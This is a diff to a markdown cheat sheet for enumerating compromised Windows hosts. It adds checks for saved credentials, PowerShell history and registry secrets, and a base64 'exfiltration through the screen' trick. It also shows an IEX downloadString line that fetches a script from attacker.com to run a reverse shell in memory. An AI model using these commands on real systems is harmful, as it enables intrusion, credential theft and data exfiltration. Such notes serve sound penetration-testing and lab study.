@@ -1,4 +1,4 @@
-# enumeration of windows environments
+# win_enumeration
 
 This page serves as a reference to be used during operations. Included items are:
 
@@ -6,7 +6,11 @@ This page serves as a reference to be used during operations. Included items are
 - prepared statements, ready for copy paste
 - legacy reference notes, useful for writing and for when other methods have been exhausted
 
-## default enumeration activity - noisy, lab use only
+## default enumeration activity 
+
+> Noisy,  lab use only. Campaigns should be planned, only necessary commands should touch the target
+
+### checklist
 
 1. `systeminfo`
 	1. we care about the most recent patch and build numbers
@@ -21,7 +25,32 @@ This page serves as a reference to be used during operations. Included items are
 5. manual enumeration
 	1. focus on human activity
 	2. scripts, notes, custom applications
-	3. passwords written where they shoud not be
+	3. passwords written where they should not be
+	4. review the ouput of enumeration scripts, they commonly miss the following
+		1. `cmdkey /list`
+		2. scheduled tasks
+		3. startup apps
+		4. access control permissions on registry services
+		5. Saved credentials in tools such as `PuTTY`
+		6. credentials saved in registry keys
+
+
+### prepared statements
+
+```cmd
+systeminfo
+```
+
+The following should be executed in a powershell context
+
+```powershell
+Get-Content $env:windir\System32\Drivers\etc\hosts
+```
+
+```powershell
+Get-Content $env:appdata\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
+```
+
 
 
 ## powershell
@@ -52,16 +81,27 @@ get-childitem -force -recurse -path C:\ -errorACtion SilentlyContinue -include *
 Get-ChildItem C:\* -recurse | Select-String -pattern SEARCH_TERM
 ```
 
+## exfiltration through the screen
+
+Provided file size is small enough, set a variable `$path = "C:\Path\To\file"` then put the following prepared statement into the shell
+
+```powershell
+$b64 = (Get-Content -Path $path -Encoding byte); [convert]::ToBase64String($b64)
+```
+
+Note that the resulting b64 is in `utf-16le` and should be converted with the `iconv` utility before further usage. 
+
+
 ## using common scripts
 
-### Execution without touching disk
+### execution without touching disk
 
 1. host the `script.ps1` 
 2. edit the `script.ps1` file to call w.e. function you want by placing the function call, including arguments, at the end of this file. This is often the reverse shell.
 3. use `IEX(new-object net.webClient).downloadString('http://attacker.com/script.ps1')` 
 
 
-### Execution with touching disk 
+### execution with touching disk 
 
 > `PowerUp.ps1` is used as an example
 
